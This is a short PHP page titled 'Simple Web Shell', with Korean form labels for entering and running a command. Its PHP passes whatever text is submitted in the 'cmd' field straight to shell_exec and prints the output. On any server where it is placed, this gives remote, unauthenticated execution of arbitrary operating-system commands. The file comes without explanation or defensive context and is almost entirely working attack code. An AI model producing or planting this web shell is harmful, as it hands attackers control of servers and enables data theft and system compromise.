<!DOCTYPE html>
<html>
<head>
    <title>Simple Web Shell</title>
</head>
<body>
    <h2>Web Shell</h2>
    <form method="POST">
        <input type="text" name="cmd" placeholder="명령어 입력" style="width: 300px;" />
        <button type="submit">실행</button>
    </form>
    <pre>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = shell_exec($command);
    echo htmlspecialchars($output);
}
?>
    </pre>
</body>
</html>
